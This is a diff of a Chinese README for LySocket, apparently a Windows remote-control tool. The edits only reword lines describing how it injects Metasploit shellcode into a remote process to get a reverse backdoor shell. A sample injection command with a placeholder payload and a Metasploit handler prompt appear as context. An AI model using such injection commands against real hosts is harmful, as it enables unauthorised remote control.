@@ -10,7 +10,7 @@
 
 <br>
 
-LySocket 是一款使用纯 `WindowsAPI` 实现的命令行版远程控制工具，该工具通过最少的代码实现了套接字的批量管理操作，用户可以指定对远程主机内特定进程注入`ShellCode`载荷，只要对端`LyClient`客户端能一直运行，则`Metasploit`攻击载荷就可以很方便的注入到目标主机任意的进程内反弹。
+LySocket 是一款使用纯 `WindowsAPI` 实现的命令行版远程控制工具，该工具通过最少的代码实现了套接字的批量管理操作，用户可以指定对远程主机内特定进程注入`ShellCode`攻击载荷，只要对端`LyClient`客户端能一直运行，则`Metasploit`攻击载荷就可以很方便的注入到目标主机任意的进程内反弹。
 
 首先需要通过`Metasploit`工具生成一个有效载荷。
 ```
@@ -66,7 +66,7 @@ msf6 exploit(multi/handler) > exploit
 
  - 注入ShellCode到指定进程内
 
-使用如下命令注入ShellCode到特定进程内，MSF即可反弹后门链接了。
+使用如下命令注入ShellCode到特定进程内，此时`Metasploit`即可看到反弹的后门了。
 ```C
 [ LySocket ] # InjectRemoteCode --address 127.0.0.1 --pid 1234 --shellcode xfec12defferciruq
 [+] Success..
